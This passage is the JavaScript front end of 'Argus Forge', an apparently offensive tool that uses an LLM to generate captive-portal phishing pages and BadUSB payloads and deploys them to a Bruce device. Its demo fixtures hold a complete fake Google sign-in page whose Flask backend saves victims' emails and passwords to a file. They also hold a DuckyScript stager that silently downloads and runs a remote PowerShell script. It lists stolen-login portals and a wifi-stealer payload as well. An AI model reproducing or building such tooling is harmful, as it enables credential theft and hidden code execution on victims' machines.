/* ============================================================
   ARGUS FORGE — UI controller. Bruce-only.
   Talks to the native Kotlin bridge (`window.Argus`) when present;
   falls back to an in-browser DEMO mode for previewing / screenshots.
   ============================================================ */

(function () {
  'use strict';

  var hasBridge = typeof window.Argus !== 'undefined';
  var params = new URLSearchParams(window.location.search);
  var DEMO = !hasBridge || params.get('demo') === '1';
  var NOSPLASH = params.get('nosplash') === '1';

  // ---- callback registry (native -> JS) -----------------------------------
  window.ArgusBridge = window.ArgusBridge || { pending: {} };
  window.ArgusBridge.resolve = function (id, payload) {
    var p = window.ArgusBridge.pending[id];
    if (!p) return;
    delete window.ArgusBridge.pending[id];
    if (payload && payload.ok) p.resolve(payload.data);
    else p.reject(new Error((payload && payload.error) || 'unknown error'));
  };

  var cbSeq = 0;
  function call(fn) {
    var args = Array.prototype.slice.call(arguments, 1);
    return new Promise(function (resolve, reject) {
      var id = 'cb' + (++cbSeq) + '_' + Date.now().toString(36);
      window.ArgusBridge.pending[id] = { resolve: resolve, reject: reject };
      try {
        window.Argus[fn].apply(window.Argus, args.concat(id));
      } catch (e) {
        delete window.ArgusBridge.pending[id];
        reject(e);
      }
    });
  }

  // ---- state --------------------------------------------------------------
  var DEFAULTS = {
    api_key: '', base_url: 'https://api.openai.com/v1', model: 'gpt-4o-mini',
    github_token: '',
    bruce_host: 'http://bruce.local', bruce_user: 'admin', bruce_pass: 'bruce'
  };
  var config = JSON.parse(JSON.stringify(DEFAULTS));
  var library = { portals: [], badusb: [] };
  var vaultEntries = [];
  var storeApps = [];
  var storeThemes = [];

  // ---- demo fixtures ------------------------------------------------------
  var DEMO_LIBRARY = {
    portals: [
      { repo: 'bigbrodude6119/flipper-zero-evil-portal', branch: 'main', path: 'portals/Google/Google.html', size: 4296 },
      { repo: 'FlippieHacks/FlipperZeroEuropeanPortals', branch: 'main', path: 'portals/amazon/index.html', size: 5530 },
      { repo: 'RogueMaster/flipperzero-evil-portal', branch: 'main', path: 'evilportal/templates/facebook.html', size: 8901 },
      { repo: 'L-ubu/flipper-portals', branch: 'main', path: 'portals/netflix/Netflix.html', size: 3174 }
    ],
    badusb: [
      { repo: 'hak5/usbrubberducky-payloads', branch: 'master', path: 'payloads/library/prank/wallpaper-prank/payload.txt', size: 1843 },
      { repo: 'I-Am-Jakoby/Flipper-Zero-BadUSB', branch: 'main', path: 'Payloads/Flip-Windows-Wallpaper/Wallpaper.txt', size: 2252 },
      { repo: 'FalsePhilosopher/badusb', branch: 'main', path: 'payloads/wifi_stealer.txt', size: 3686 }
    ]
  };

  var DEMO_OUTPUT = {
    portal: [
      '[M]',
      '',
      'google sign-in captive portal, flask capture backend, dark responsive.',
      '',
      '<!DOCTYPE html>',
      '<html>',
      '<head>',
      '  <meta charset="utf-8">',
      '  <meta name="viewport" content="width=device-width, initial-scale=1">',
      '  <title>Sign in - Google Accounts</title>',
      '  <style>',
      '    body { font-family: Roboto, Arial, sans-serif; background:#fff;',
      '           display:flex; min-height:100vh; align-items:center; justify-content:center; }',
      '    .card { width:min(420px,92vw); padding:40px 32px; border:1px solid #dadce0; border-radius:8px; }',
      '    h1 { font-size:24px; font-weight:400; margin:0 0 8px; }',
      '    input { width:100%; padding:12px; margin:8px 0; border:1px solid #dadce0; border-radius:4px; }',
      '    button { width:100%; padding:12px; background:#1a73e8; color:#fff; border:0; border-radius:4px; }',
      '  </style>',
      '</head>',
      '<body>',
      '  <div class="card">',
      '    <h1>Sign in</h1>',
      '    <p style="color:#5f6368">Use your Google Account</p>',
      '    <form method="POST" action="/capture">',
      '      <input type="email" name="email" placeholder="Email or phone" required>',
      '      <input type="password" name="password" placeholder="Password" required>',
      '      <button type="submit">Next</button>',
      '    </form>',
      '  </div>',
      '</body>',
      '</html>',
      '',
      'capture backend (flask):',
      '```python',
      'from flask import Flask, request',
      'app = Flask(__name__)',
      '@app.route("/capture", methods=["POST"])',
      'def capture():',
      '    with open("creds.csv", "a") as f:',
      '        f.write(request.form["email"] + "," + request.form["password"] + "\\n")',
      '    return "redirect"',
      'app.run(host="0.0.0.0", port=80)',
      '```'
    ].join('\n'),
    badusb: [
      '[M]',
      '',
      'windows 11 duckyscript - powershell stager, hidden, clean exit.',
      '',
      'DELAY 2000',
      'GUI r',
      'DELAY 300',
      'STRING powershell -WindowStyle Hidden -Command "$p=Join-Path $env:TEMP u.ps1; Invoke-WebRequest https://example.com/u.ps1 -OutFile $p; Start-Process powershell -ArgumentList -ExecutionPolicy Bypass -File,$p -WindowStyle Hidden"',
      'ENTER',
      'DELAY 500',
      'STRING exit',
      'ENTER',
      '',
      'notes: swap example.com for your staging host. payload runs hidden, no console window.'
    ].join('\n')
  };

  var DEMO_STORE = {
    apps: [
      { slug: 'BruceDevices/App-Store/App Store', name: 'App Store', category: 'Tools', version: '1.1.0', owner: 'BruceDevices', description: 'App store for Bruce devices with over-the-air install and updates for scripts and themes', icon: 'https://brucedevices.github.io/App-Store-Data/repositories/BruceDevices/App-Store/App%20Store/logo.png' },
      { slug: 'BruceDevices/firmware/Arcade Games', name: 'Arcade Games', category: 'Games', version: '1.0.1', owner: 'BruceDevices', description: 'Collection of arcade games', icon: 'https://brucedevices.github.io/App-Store-Data/repositories/BruceDevices/firmware/Arcade%20Games/logo.png' },
      { slug: 'BruceDevices/firmware/Dino', name: 'Dino', category: 'Games', version: '1.0.1', owner: 'BruceDevices', description: 'Dino game', icon: 'https://brucedevices.github.io/App-Store-Data/repositories/BruceDevices/firmware/Dino/logo.png' },
      { slug: 'sloth632/Cricket-app/Cricket', name: 'Cricket', category: 'Audio', version: '1.0.0', owner: 'sloth632', description: 'Cricket.js is an audio app that plays cricket sounds.', icon: 'https://brucedevices.github.io/App-Store-Data/repositories/sloth632/Cricket-app/Cricket/logo.png' },
      { slug: 'BruceDevices/firmware/Calculator M5 Stick', name: 'Calculator', category: 'Utilities', version: '1.0.1', owner: 'BruceDevices', description: 'Calculator', icon: 'https://brucedevices.github.io/App-Store-Data/repositories/BruceDevices/firmware/Calculator%20M5%20Stick/logo.png' },
      { slug: 'emericklaw/Bruce-Flashlight-App/Flashlight', name: 'Flashlight', category: 'Utilities', version: '1.0.1', owner: 'emericklaw', description: 'Simple multi-colour flashlight', icon: 'https://brucedevices.github.io/App-Store-Data/repositories/emericklaw/Bruce-Flashlight-App/Flashlight/logo.png' }
    ],
    themes: [
      { slug: 'CreeperRick/BruceStore/Cyber Hacker 240x135', name: 'Cyber Hacker', category: 'Themes', version: '1.0.2', owner: 'CreeperRick', description: 'Cool matrix theme', icon: 'https://brucedevices.github.io/App-Store-Data/repositories/CreeperRick/BruceStore/Cyber%20Hacker%20240x135/logo.png' },
      { slug: 'BruceDevices/App-Store-Apps/Dark Mode 320x170', name: 'Dark Mode', category: 'Themes', version: '1.0.0', owner: 'BruceDevices', description: 'A sleek and modern dark theme.', icon: 'https://brucedevices.github.io/App-Store-Data/repositories/BruceDevices/App-Store-Apps/Dark%20Mode%20320x170/logo.png' },
      { slug: 'BruceDevices/App-Store-Apps/Flipper 320x170', name: 'Flipper', category: 'Themes', version: '1.0.0', owner: 'BruceDevices', description: 'Flipper Zero based theme.', icon: 'https://brucedevices.github.io/App-Store-Data/repositories/BruceDevices/App-Store-Apps/Flipper%20320x170/logo.png' },
      { slug: 'BruceDevices/App-Store-Apps/Watch Dogs 320x170', name: 'Watch Dogs', category: 'Themes', version: '1.0.0', owner: 'BruceDevices', description: 'A theme for Bruce based on the Watch Dogs video game series.', icon: 'https://brucedevices.github.io/App-Store-Data/repositories/BruceDevices/App-Store-Apps/Watch%20Dogs%20320x170/logo.png' }
    ]
  };

  var DEMO_VAULT = [
    { id: 'demo1', tab: 'portal', title: 'google sign-in captive portal, flask capture backend', content: DEMO_OUTPUT.portal, ts: Date.now() - 3600000 },
    { id: 'demo2', tab: 'badusb', title: 'windows 11 duckyscript - powershell stager', content: DEMO_OUTPUT.badusb, ts: Date.now() - 7200000 }
  ];

  // ---- small utils --------------------------------------------------------
  function sleep(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }
  function $(sel, root) { return (root || document).querySelector(sel); }
  function $all(sel, root) { return Array.prototype.slice.call((root || document).querySelectorAll(sel)); }
  function pad2(n) { return String(n).padStart(2, '0'); }
  function stampStr() {
    var d = new Date();
    return d.getFullYear() + pad2(d.getMonth() + 1) + pad2(d.getDate()) +
      '_' + pad2(d.getHours()) + pad2(d.getMinutes()) + pad2(d.getSeconds());
  }
  function fmtSize(bytes) {
    var kb = bytes / 1024;
    if (kb < 1024) return kb.toFixed(1) + 'KB';
    return (kb / 1024).toFixed(1) + 'MB';
  }
  function rstripSlash(s) { return s.replace(/\/+$/, ''); }
  function esc(s) {
    return String(s == null ? '' : s).replace(/[&<>"']/g, function (c) {
      return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c];
    });
  }
  function preview(content) {
    var t = (content || '').trim();
    return t.length > 220 ? t.slice(0, 220) + '\u2026' : t;
  }

  // ---- config -------------------------------------------------------------
  function loadConfig() {
    try {
      if (hasBridge) {
        config = JSON.parse(window.Argus.getConfig());
      } else {
        var s = localStorage.getItem('argusforge');
        if (s) config = Object.assign({}, DEFAULTS, JSON.parse(s));
      }
    } catch (e) { config = JSON.parse(JSON.stringify(DEFAULTS)); }
  }
  function saveConfig() {
    try {
      if (hasBridge) window.Argus.setConfig(JSON.stringify(config));
      else localStorage.setItem('argusforge', JSON.stringify(config));
    } catch (e) { /* ignore */ }
  }

  // ---- splash -------------------------------------------------------------
  function setSplashStatus(text, pct) {
    var s = document.getElementById('splashStatus');
    var p = document.getElementById('splashProgress');
    if (s) s.textContent = text;
    if (p && typeof pct === 'number') p.style.width = pct + '%';
  }
  function finishBoot() {
    var s = document.getElementById('splash');
    if (s && !s.classList.contains('hidden')) {
      s.classList.add('hidden');
      setTimeout(function () { if (s.parentNode) s.parentNode.removeChild(s); }, 600);
    }
    document.getElementById('app').hidden = false;
  }
  function initParticles() {
    var canvas = document.getElementById('splashCanvas');
    if (!canvas) return;
    if (window.matchMedia('(prefers-reduced-motion: reduce)').matches) { canvas.style.display = 'none'; return; }
    var ctx = canvas.getContext('2d');
    if (!ctx) return;
    var W = 0, H = 0;
    function resize() { W = canvas.width = window.innerWidth; H = canvas.height = window.innerHeight; }
    resize();
    window.addEventListener('resize', resize);
    var parts = [];
    for (var i = 0; i < 150; i++) {
      parts.push({ x: Math.random() * W, y: Math.random() * H, z: Math.random(), s: 0.3 + Math.random() * 0.6 });
    }
    var running = true;
    function frame() {
      if (!running) return;
      ctx.fillStyle = 'rgba(10,10,10,0.3)';
      ctx.fillRect(0, 0, W, H);
      for (var k = 0; k < parts.length; k++) {
        var p = parts[k];
        p.y += p.s * (0.5 + p.z);
        if (p.y > H) { p.y = -5; p.x = Math.random() * W; }
        ctx.fillStyle = 'rgba(139,92,246,' + (0.3 + p.z * 0.7) + ')';
        ctx.beginPath();
        ctx.arc(p.x, p.y, 0.5 + p.z * 1.5, 0, Math.PI * 2);
        ctx.fill();
      }
      requestAnimationFrame(frame);
    }
    frame();
    window.__stopSplash = function () { running = false; };
  }
  function startSplash() {
    if (NOSPLASH) { finishBoot(); return; }
    initParticles();
    var steps = [[800, 'Loading UI\u2026', 10], [1600, 'Loading account\u2026', 45],
                 [2200, 'Fetching stats\u2026', 65], [2800, 'Ready', 100]];
    steps.forEach(function (st) { setTimeout(function () { setSplashStatus(st[1], st[2]); }, st[0]); });
    setTimeout(finishBoot, 3200);
    setTimeout(function () {
      var el = document.getElementById('splash');
      if (el && !el.classList.contains('hidden')) finishBoot();
    }, 20000);
  }

  // ---- tabs ---------------------------------------------------------------
  function switchTab(key) {
    $all('.tab').forEach(function (t) { t.classList.toggle('active', t.dataset.tab === key); });
    $all('.tab-panel').forEach(function (p) { p.classList.toggle('active', p.id === 'tab-' + key); });
  }

  // ---- status helpers -----------------------------------------------------
  function setStatus(panel, text, color) {
    $('[data-status]', panel).textContent = text;
    $('[data-status-dot]', panel).style.background = color || 'var(--fg-mute)';
  }
  function setBruceState(state, color) {
    var labels = { unchecked: 'bruce: unchecked', checking: 'bruce: checking...', offline: 'bruce: offline', connected: 'bruce: connected' };
    var txt = document.getElementById('bruceText');
    var dot = document.getElementById('bruceDot');
    if (txt) txt.textContent = labels[state] || state;
    if (dot) dot.style.background = color || 'var(--fg-mute)';
  }

  // ---- forge: generate / copy / download / vault / send -------------------
  function apiGenerate(key, prompt) {
    if (DEMO) return sleep(1400).then(function () { return DEMO_OUTPUT[key]; });
    return call('generate', key, prompt).then(function (d) { return d.content; });
  }

  function generate(panel) {
    var key = panel.dataset.tabKey;
    var prompt = $('[data-prompt]', panel).value.trim();
    var btn = $('[data-action="generate"]', panel);
    var out = $('[data-output]', panel);
    if (!prompt) { setStatus(panel, 'empty prompt', 'var(--danger)'); return; }
    if (!config.api_key || !config.base_url || !config.model) {
      setStatus(panel, 'set api key in settings', 'var(--danger)');
      openSettings();
      return;
    }
    btn.disabled = true; btn.textContent = 'WORKING...';
    out.value = '';
    setStatus(panel, 'sending...', 'var(--accent-hi)');
    apiGenerate(key, prompt).then(function (content) {
      out.value = content;
      setStatus(panel, 'done', 'var(--good)');
    }).catch(function (e) {
      out.value = '[error]\n' + (e && e.message ? e.message : e);
      setStatus(panel, 'error', 'var(--danger)');
    }).then(function () {
      btn.disabled = false; btn.textContent = 'GENERATE';
    });
  }

  function clearPrompt(panel) {
    $('[data-prompt]', panel).value = '';
  }

  function copyOutput(panel) {
    var txt = $('[data-output]', panel).value.trim();
    if (!txt) { setStatus(panel, 'nothing to copy', 'var(--danger)'); return; }
    if (hasBridge) {
      window.Argus.copy(txt);
    } else if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(txt).catch(function () { fallbackCopy(txt); });
    } else {
      fallbackCopy(txt);
    }
    setStatus(panel, 'copied', 'var(--accent-hi)');
  }
  function fallbackCopy(text) {
    var ta = document.createElement('textarea');
    ta.value = text; ta.style.position = 'fixed'; ta.style.opacity = '0';
    document.body.appendChild(ta); ta.select();
    try { document.execCommand('copy'); } catch (e) { }
    document.body.removeChild(ta);
  }

  function downloadOutput(panel) {
    var key = panel.dataset.tabKey;
    var txt = $('[data-output]', panel).value;
    if (!txt.trim()) { setStatus(panel, 'nothing to download', 'var(--danger)'); return; }
    var ext = key === 'badusb' ? '.txt' : '.html';
    var base = key === 'badusb' ? 'badusb' : 'portal';
    var filename = base + '_' + stampStr() + ext;
    if (DEMO) {
      saveBlob(filename, txt, key === 'badusb' ? 'text/plain' : 'text/html');
      setStatus(panel, 'saved -> ' + filename, 'var(--good)');
    } else {
      call('saveText', filename, txt).then(function (d) {
        setStatus(panel, 'saved -> ' + d.path, 'var(--good)');
      }).catch(function (e) {
        setStatus(panel, 'save failed: ' + e.message, 'var(--danger)');
      });
    }
  }
  function saveBlob(filename, content, mime) {
    var blob = new Blob([content], { type: mime });
    var url = URL.createObjectURL(blob);
    var a = document.createElement('a');
    a.href = url; a.download = filename;
    document.body.appendChild(a); a.click(); a.remove();
    setTimeout(function () { URL.revokeObjectURL(url); }, 1000);
  }

  function demoPath(key) {
    var base = key === 'badusb' ? 'badusb' : 'portal';
    var ext = key === 'badusb' ? '.txt' : '.html';
    var f = base + '_' + stampStr() + ext;
    return (key === 'badusb' ? '/badusb/' : '/evilportal/') + f;
  }

  function sendToBruce(panel) {
    var key = panel.dataset.tabKey;
    var txt = $('[data-output]', panel).value;
    var btn = $('[data-action="bruce"]', panel);
    if (!txt.trim()) { setStatus(panel, 'nothing to send', 'var(--danger)'); return; }
    btn.disabled = true; btn.textContent = 'CONNECTING...';
    setStatus(panel, 'checking bruce...', 'var(--warn)');
    setBruceState('checking', 'var(--warn)');
    var p = DEMO ? sleep(1000).then(function () { return { path: demoPath(key) }; })
                 : call('deployBruce', key, txt);
    p.then(function (d) {
      setStatus(panel, 'sent -> ' + d.path, 'var(--good)');
      setBruceState('connected', 'var(--good)');
    }).catch(function (e) {
      setStatus(panel, 'bruce ' + (e && e.code === 'offline' ? 'offline' : 'error'), 'var(--danger)');
      setBruceState('offline', 'var(--danger)');
    }).then(function () {
      btn.disabled = false; btn.textContent = 'SEND // BRUCE';
    });
  }

  // ---- vault --------------------------------------------------------------
  function vaultTitle(content, tab) {
    var first = '';
    var lines = (content || '').split(/\r?\n/);
    for (var i = 0; i < lines.length; i++) {
      var t = lines[i].trim();
      if (t && t !== '[M]') { first = t; break; }
    }
    if (!first) first = tab === 'badusb' ? 'Bad USB payload' : 'Evil portal';
    return first.length > 64 ? first.slice(0, 64) + '\u2026' : first;
  }

  function renderVault(panel) {
    var key = panel.dataset.tabKey;
    var listEl = $('[data-vault-list]', panel);
    var countEl = $('[data-vault-count]', panel);
    var entries = vaultEntries.filter(function (e) { return e.tab === key; });
    countEl.textContent = entries.length + ' items';
    if (!entries.length) {
      listEl.innerHTML = '<div class="empty">nothing saved yet - generate and hit SAVE TO VAULT</div>';
      return;
    }
    listEl.innerHTML = entries.map(function (e) {
      return '<div class="vault-item" data-id="' + esc(e.id) + '">'
        + '<div class="vault-item-head">'
        +   '<span class="vault-title">' + esc(e.title) + '</span>'
        +   '<span class="vault-actions">'
        +     '<button class="btn btn-ghost btn-sm" data-act="copy">COPY</button>'
        +     '<button class="btn btn-ghost btn-sm" data-act="delete">DELETE</button>'
        +   '</span>'
        + '</div>'
        + '<pre class="vault-preview">' + esc(preview(e.content)) + '</pre>'
        + '</div>';
    }).join('');
  }
  function renderVaults() {
    $all('.forge').forEach(renderVault);
  }
  function findVault(id) {
    for (var i = 0; i < vaultEntries.length; i++) if (vaultEntries[i].id === id) return vaultEntries[i];
    return null;
  }

  function saveToVault(panel) {
    var key = panel.dataset.tabKey;
    var txt = $('[data-output]', panel).value;
    if (!txt.trim()) { setStatus(panel, 'nothing to save', 'var(--danger)'); return; }
    if (DEMO) {
      vaultEntries.unshift({ id: 'demo' + Date.now(), tab: key, title: vaultTitle(txt, key), content: txt, ts: Date.now() });
      renderVaults();
      setStatus(panel, 'saved to vault', 'var(--good)');
    } else {
      call('vaultSave', key, txt).then(function (d) {
        if (d.entry) vaultEntries.unshift(d.entry);
        renderVaults();
        setStatus(panel, 'saved to vault', 'var(--good)');
      }).catch(function (e) {
        setStatus(panel, 'save failed: ' + e.message, 'var(--danger)');
      });
    }
  }

  function copyVaultEntry(id) {
    var e = findVault(id);
    if (!e) return;
    if (hasBridge) window.Argus.copy(e.content || '');
    else if (navigator.clipboard && navigator.clipboard.writeText) navigator.clipboard.writeText(e.content || '').catch(function () { fallbackCopy(e.content || ''); });
    else fallbackCopy(e.content || '');
    if (hasBridge) window.Argus.toast('Copied');
  }

  function deleteVaultEntry(id) {
    vaultEntries = vaultEntries.filter(function (e) { return e.id !== id; });
    renderVaults();
    if (hasBridge) call('vaultDelete', id).catch(function () {});
  }

  // ---- library ------------------------------------------------------------
  function renderLibrary(kind) {
    var pane = $('.pane[data-pane="' + kind + '"]');
    var listEl = $('[data-list]', pane);
    var filter = $('[data-filter]', pane).value.toLowerCase();
    var all = library[kind] || [];
    var visible = [];
    all.forEach(function (e, idx) {
      if (!filter || (e.repo + ' ' + e.path).toLowerCase().indexOf(filter) >= 0) visible.push({ e: e, idx: idx });
    });
    $('[data-count]', pane).textContent = visible.length + ' items';
    if (!visible.length) { listEl.innerHTML = '<div class="empty">no items</div>'; return; }
    listEl.innerHTML = visible.map(function (v) {
      var name = v.e.repo.split('/').pop();
      return '<label class="item"><input type="checkbox" data-kind="' + kind + '" data-idx="' + v.idx + '">' +
        '<span>' + name + '/' + v.e.path + ' <span class="meta">[' + fmtSize(v.e.size) + ']</span></span></label>';
    }).join('');
  }

  function selectedEntries() {
    var sel = [];
    $all('.pane-list input:checked').forEach(function (cb) {
      var e = library[cb.dataset.kind] && library[cb.dataset.kind][parseInt(cb.dataset.idx, 10)];
      if (e) sel.push(e);
    });
    return sel;
  }

  function refreshLibrary() {
    var btn = document.getElementById('libRefresh');
    var status = document.getElementById('libStatus');
    btn.disabled = true; btn.textContent = 'LOADING...';
    status.textContent = 'fetching repositories...'; status.style.color = 'var(--warn)';
    var p = DEMO ? sleep(900).then(function () { return { portals: DEMO_LIBRARY.portals, badusb: DEMO_LIBRARY.badusb, errors: [] }; })
                 : call('libraryRefresh');
    p.then(function (data) {
      library.portals = data.portals || [];
      library.badusb = data.badusb || [];
      renderLibrary('portal'); renderLibrary('badusb');
      var total = library.portals.length + library.badusb.length;
      var errs = (data.errors || []).length;
      status.textContent = errs ? total + ' items loaded, ' + errs + ' repo(s) failed' : total + ' items loaded';
      status.style.color = errs ? 'var(--warn)' : 'var(--good)';
    }).catch(function (e) {
      status.textContent = 'refresh failed: ' + e.message; status.style.color = 'var(--danger)';
    }).then(function () {
      btn.disabled = false; btn.textContent = 'REFRESH';
    });
  }

  function searchLibrary() {
    var q = document.getElementById('libSearch').value.trim();
    if (!q) return;
    var status = document.getElementById('libStatus');
    status.textContent = "searching github for '" + q + "'..."; status.style.color = 'var(--warn)';
    var p = DEMO ? sleep(900).then(function () { return { portals: [], badusb: [] }; })
                 : call('librarySearch', q);
    p.then(function (data) {
      library.portals = library.portals.concat(data.portals || []);
      library.badusb = library.badusb.concat(data.badusb || []);
      renderLibrary('portal'); renderLibrary('badusb');
      status.textContent = 'added ' + (data.portals || []).length + ' portals, ' + (data.badusb || []).length + ' badusb';
      status.style.color = 'var(--good)';
    }).catch(function (e) {
      status.textContent = 'search error: ' + (e.message || '').slice(0, 80); status.style.color = 'var(--danger)';
    });
  }

  function downloadSelected() {
    var entries = selectedEntries();
    var status = document.getElementById('libDlStatus');
    if (!entries.length) { status.textContent = 'nothing selected'; status.style.color = 'var(--danger)'; return; }
    status.textContent = 'downloading ' + entries.length + '...'; status.style.color = 'var(--warn)';
    var p = DEMO ? sleep(900).then(function () { return { ok: entries.length, total: entries.length, failed: [] }; })
                 : call('libraryDownload', JSON.stringify(entries));
    p.then(function (data) {
      if (data.failed && data.failed.length) { status.textContent = data.ok + '/' + data.total + ' downloaded, ' + data.failed.length + ' failed'; status.style.color = 'var(--warn)'; }
      else { status.textContent = data.ok + '/' + data.total + ' downloaded'; status.style.color = 'var(--good)'; }
    }).catch(function (e) {
      status.textContent = 'download failed: ' + e.message; status.style.color = 'var(--danger)';
    });
  }

  function sendSelectedBruce() {
    var entries = selectedEntries();
    var status = document.getElementById('libDlStatus');
    if (!entries.length) { status.textContent = 'nothing selected'; status.style.color = 'var(--danger)'; return; }
    status.textContent = 'sending ' + entries.length + ' to bruce...'; status.style.color = 'var(--warn)';
    setBruceState('checking', 'var(--warn)');
    var p = DEMO ? sleep(1100).then(function () { return { ok: entries.length, total: entries.length, failed: [] }; })
                 : call('libraryDeployBruce', JSON.stringify(entries));
    p.then(function (data) {
      if (data.failed && data.failed.length) { status.textContent = data.ok + '/' + data.total + ' sent to bruce, ' + data.failed.length + ' failed'; status.style.color = 'var(--warn)'; }
      else { status.textContent = data.ok + '/' + data.total + ' sent to bruce'; status.style.color = 'var(--good)'; }
      setBruceState('connected', 'var(--good)');
    }).catch(function (e) {
      status.textContent = 'bruce send failed: ' + e.message; status.style.color = 'var(--danger)';
      setBruceState('offline', 'var(--danger)');
    });
  }

  // ---- store --------------------------------------------------------------
  function renderStoreGrid(el, items) {
    if (!items.length) { el.innerHTML = '<div class="empty">no items</div>'; return; }
    el.innerHTML = items.map(function (it) {
      var letter = (it.name || '?').charAt(0).toUpperCase();
      return '<div class="store-item">'
        + '<div class="store-icon-wrap"><span class="store-letter">' + esc(letter) + '</span><img class="store-icon" src="' + esc(it.icon) + '" alt="" onerror="this.remove()"></div>'
        + '<div class="store-info">'
        +   '<div class="store-name">' + esc(it.name) + '</div>'
        +   '<div class="store-meta">' + esc(it.category) + ' \u00b7 v' + esc(it.version) + ' \u00b7 ' + esc(it.owner) + '</div>'
        +   '<div class="store-desc">' + esc(it.description) + '</div>'
        + '</div>'
        + '<button class="btn btn-outline store-install" data-install="' + esc(it.slug) + '">INSTALL</button>'
        + '</div>';
    }).join('');
  }
  function renderStore() {
    renderStoreGrid(document.getElementById('storeApps'), storeApps);
    renderStoreGrid(document.getElementById('storeThemes'), storeThemes);
  }
  function switchStoreTab(key) {
    $all('.store-subtab').forEach(function (t) { t.classList.toggle('active', t.dataset.storeTab === key); });
    document.getElementById('storeApps').hidden = (key !== 'apps');
    document.getElementById('storeThemes').hidden = (key !== 'themes');
  }

  function storeFetch() {
    var status = document.getElementById('storeStatus');
    var retry = document.getElementById('storeRetry');
    status.textContent = 'fetching app store...'; status.style.color = 'var(--warn)';
    retry.hidden = true;
    var p = DEMO ? sleep(900).then(function () { return DEMO_STORE; }) : call('storeFetch');
    p.then(function (data) {
      storeApps = data.apps || [];
      storeThemes = data.themes || [];
      renderStore();
      status.textContent = (storeApps.length + storeThemes.length) + ' items'; status.style.color = 'var(--good)';
    }).catch(function (e) {
      status.textContent = 'failed to load store: ' + e.message; status.style.color = 'var(--danger)';
      retry.hidden = false;
    });
  }

  function installStoreItem(slug) {
    var btn = document.querySelector('[data-install="' + slug + '"]');
    var status = document.getElementById('storeStatus');
    if (btn) { btn.disabled = true; btn.textContent = 'INSTALLING...'; }
    status.textContent = 'installing...'; status.style.color = 'var(--warn)';
    var p = DEMO ? sleep(1200).then(function () { return { ok: 1, total: 1, failed: [] }; })
                 : call('storeInstall', slug);
    p.then(function (d) {
      if (btn) { btn.disabled = false; btn.textContent = 'INSTALL'; }
      if (d.failed && d.failed.length) { status.textContent = 'installed ' + d.ok + '/' + d.total + ', ' + d.failed.length + ' failed'; status.style.color = 'var(--warn)'; }
      else { status.textContent = 'installed to Bruce'; status.style.color = 'var(--good)'; }
      if (hasBridge) window.Argus.toast('Installed ' + d.ok + ' file(s) to Bruce');
    }).catch(function (e) {
      if (btn) { btn.disabled = false; btn.textContent = 'INSTALL'; }
      status.textContent = 'install failed: ' + e.message; status.style.color = 'var(--danger)';
    });
  }

  // ---- settings modal -----------------------------------------------------
  function openSettings() {
    document.getElementById('cfg_api_key').value = config.api_key || '';
    document.getElementById('cfg_base_url').value = config.base_url || '';
    document.getElementById('cfg_model').value = config.model || '';
    document.getElementById('cfg_github_token').value = config.github_token || '';
    document.getElementById('cfg_bruce_host').value = config.bruce_host || '';
    document.getElementById('cfg_bruce_user').value = config.bruce_user || '';
    document.getElementById('cfg_bruce_pass').value = config.bruce_pass || '';
    document.getElementById('settingsModal').hidden = false;
  }
  function closeSettings() { document.getElementById('settingsModal').hidden = true; }
  function saveSettings() {
    config.api_key = document.getElementById('cfg_api_key').value.trim();
    config.base_url = rstripSlash(document.getElementById('cfg_base_url').value.trim());
    config.model = document.getElementById('cfg_model').value.trim();
    config.github_token = document.getElementById('cfg_github_token').value.trim();
    config.bruce_host = rstripSlash(document.getElementById('cfg_bruce_host').value.trim());
    config.bruce_user = document.getElementById('cfg_bruce_user').value.trim();
    config.bruce_pass = document.getElementById('cfg_bruce_pass').value;
    saveConfig();
    closeSettings();
  }

  // ---- demo seed ----------------------------------------------------------
  function demoSeed() {
    $('[data-output]', document.getElementById('tab-portal')).value = DEMO_OUTPUT.portal;
    setStatus(document.getElementById('tab-portal'), 'done', 'var(--good)');
    $('[data-output]', document.getElementById('tab-badusb')).value = DEMO_OUTPUT.badusb;
    setStatus(document.getElementById('tab-badusb'), 'done', 'var(--good)');
    library.portals = DEMO_LIBRARY.portals.slice();
    library.badusb = DEMO_LIBRARY.badusb.slice();
    renderLibrary('portal');
    renderLibrary('badusb');
    var libStatus = document.getElementById('libStatus');
    libStatus.textContent = (library.portals.length + library.badusb.length) + ' items loaded';
    libStatus.style.color = 'var(--good)';
    vaultEntries = DEMO_VAULT.map(function (e) { return { id: e.id, tab: e.tab, title: e.title, content: e.content, ts: e.ts }; });
    renderVaults();
    storeApps = DEMO_STORE.apps.slice();
    storeThemes = DEMO_STORE.themes.slice();
    renderStore();
    var storeStatus = document.getElementById('storeStatus');
    storeStatus.textContent = (storeApps.length + storeThemes.length) + ' items';
    storeStatus.style.color = 'var(--good)';
  }

  // ---- init ---------------------------------------------------------------
  function initUI() {
    $all('.tab').forEach(function (t) {
      t.addEventListener('click', function () { switchTab(t.dataset.tab); });
    });

    document.getElementById('settingsBtn').addEventListener('click', openSettings);
    document.getElementById('settingsSave').addEventListener('click', saveSettings);
    document.getElementById('settingsCancel').addEventListener('click', closeSettings);
    document.getElementById('settingsModal').addEventListener('click', function (e) {
      if (e.target === e.currentTarget) closeSettings();
    });

    $all('.forge').forEach(function (panel) {
      $('[data-action="generate"]', panel).addEventListener('click', function () { generate(panel); });
      $('[data-action="clear"]', panel).addEventListener('click', function () { clearPrompt(panel); });
      $('[data-action="copy"]', panel).addEventListener('click', function () { copyOutput(panel); });
      $('[data-action="download"]', panel).addEventListener('click', function () { downloadOutput(panel); });
      $('[data-action="vault"]', panel).addEventListener('click', function () { saveToVault(panel); });
      $('[data-action="bruce"]', panel).addEventListener('click', function () { sendToBruce(panel); });
    });

    document.getElementById('libRefresh').addEventListener('click', refreshLibrary);
    document.getElementById('libSearchBtn').addEventListener('click', searchLibrary);
    document.getElementById('libSearch').addEventListener('keydown', function (e) { if (e.key === 'Enter') searchLibrary(); });
    document.getElementById('libDownload').addEventListener('click', downloadSelected);
    document.getElementById('libSendBruce').addEventListener('click', sendSelectedBruce);

    $all('[data-filter]').forEach(function (inp) {
      inp.addEventListener('input', function () {
        renderLibrary(inp.closest('.pane').dataset.pane);
      });
    });

    document.getElementById('storeRefresh').addEventListener('click', storeFetch);
    document.getElementById('storeRetry').addEventListener('click', storeFetch);
    $all('.store-subtab').forEach(function (t) {
      t.addEventListener('click', function () { switchStoreTab(t.dataset.storeTab); });
    });

